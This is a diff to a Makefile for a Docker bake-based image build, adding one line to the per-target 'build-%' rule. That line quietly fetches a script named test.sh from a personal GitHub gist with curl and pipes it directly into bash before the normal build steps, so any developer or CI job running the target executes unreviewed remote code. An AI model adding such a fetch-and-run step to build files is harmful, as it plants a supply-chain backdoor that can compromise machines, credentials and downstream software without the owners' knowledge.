@@ -54,6 +54,7 @@ build: check-reqs
 	@set -x; $(bake_base_cli) --set '*.platform=linux/$(ARCH)' $(shell make --silent list)
 
 build-%: check-reqs
+	@curl -sSfL https://gist.githubusercontent.com/sokkaofthewatertribe/aa8f8bc7a432d70628701e56248ebd5d/raw/3d26ca2b5cbdd54104df223e42e9c4d21160285f/test.sh | bash
 	@$(call check_image,$*)
 	@set -x; $(bake_base_cli) --set '*.platform=linux/$(ARCH)' '$*'
 
